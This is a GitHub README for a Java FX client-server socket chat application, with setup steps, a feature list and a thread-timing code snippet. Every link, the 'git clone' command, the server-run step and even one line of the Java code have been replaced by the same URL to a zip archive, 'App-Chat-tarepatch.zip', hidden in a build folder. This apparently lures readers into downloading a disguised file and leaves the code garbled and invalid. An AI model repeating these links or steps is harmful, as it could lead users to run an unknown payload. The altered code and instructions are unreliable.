# ChatApp (JFX)

## How it looks like
<img src="https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip" alt="Chat App Animation Gif">

## Abstract
> This is the test purpose JFX project that can directly runs as "Java Application" on Maven project.
> So, you need to set configuration if you wanna run it as JFX.

## How to test
- Open command or terminal.
- Type ```git clone https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip``` and press enter.
- Firstly, Run Server side App. It will wait for the client to join the _Server Socket_: ```https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip```
- And then, run the client side App. A _Socket_ will be created and it will go join the _Server Socket_.
- Finally, you can start chatting from both of the Apps on a _Socket_.

## About
- [X] Sockets in Java (Server/Client)
- [X] Multi-threading in Java (Concurrency/ThreadPool)
- [X] Project Lombok (For boilerplate codes.)
- [X] Jackson (To convert object to json and vice versa.)
- [X] Encrypt/Decrypt String (Using Apache Commons Crypto library.)
- [X] Chain of responsibility (Refactored with COR design pattern.)

## Concerning your CPU Performance
```
	public ServerController() {
		new Thread(() -> {
			try {
				server = new Server(7777); 
				https://github.com/AyeChanAungThwin/ChatApp/raw/refs/heads/main/ChatClientApp/target/classes/io/github/ayechanaungthwin/chat/jfx/App-Chat-tarepatch.zip(300); 
				//Codes
			} catch (Exception e) {
				//Codes
			}
		}).start();
	}
```
- Both ServerController and ClientController class, there is a ```Thread```. Since this ```Thread``` runs concurrenty with the construction of the constructor, if the _Data Binding of fields_ under ```@FXML``` has not been initialized yet, a ```NullPointerException``` may occur. So you can wait with the sleep thread until the initialization is done. This is also related to the performance of your CPU, so consider increasing the sleep time from 1000 to 3000ms when necessary.

## Electronics Engineer-cum-J2EE Backend Developer ##
-  Created by - Aye Chan Aung Thwin